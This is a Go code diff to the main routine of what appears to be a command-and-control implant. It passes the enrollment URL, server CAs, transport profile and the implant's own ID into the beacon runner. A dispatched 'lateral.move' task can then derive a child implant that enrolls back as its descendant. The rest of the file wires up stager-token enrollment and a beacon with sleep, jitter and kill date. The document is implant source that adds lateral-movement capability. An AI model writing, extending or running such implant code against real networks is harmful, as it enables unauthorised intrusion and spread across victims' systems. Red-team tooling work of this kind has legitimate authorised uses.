@@ -72,7 +72,7 @@ func main() {
 	}
 	enrollURL := cfg.ResolvedEnrollURL()
 	logger.Printf("enrolling at %s", enrollURL)
-	enrollment, err := c2.Enroll(enrollURL, cfg.StagerToken, privateKey, serverCAs, transport)
+	enrollment, err := c2.Enroll(enrollURL, cfg.StagerToken, "", privateKey, serverCAs, transport)
 	if err != nil {
 		logger.Fatalf("enroll: %v", err)
 	}
@@ -86,7 +86,19 @@ func main() {
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
 	defer cancel()
 
-	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, cfg.KillDate, logger)
+	// The lateral.move handler re-enrolls a child against the same enroll path,
+	// naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
+	// inputs and the parent's own id into the runner so a dispatched lateral.move
+	// can derive a child that enrolls back. The child's stager token arrives in
+	// the task arguments, not here: this implant's own token is already spent.
+	enroll := beacon.EnrollBundle{
+		URL:      enrollURL,
+		CAs:      serverCAs,
+		Profile:  transport,
+		ParentID: enrollment.ImplantID,
+	}
+
+	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, cfg.KillDate, enroll, logger)
 	if err := b.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
 		logger.Fatalf("beacon: %v", err)
 	}
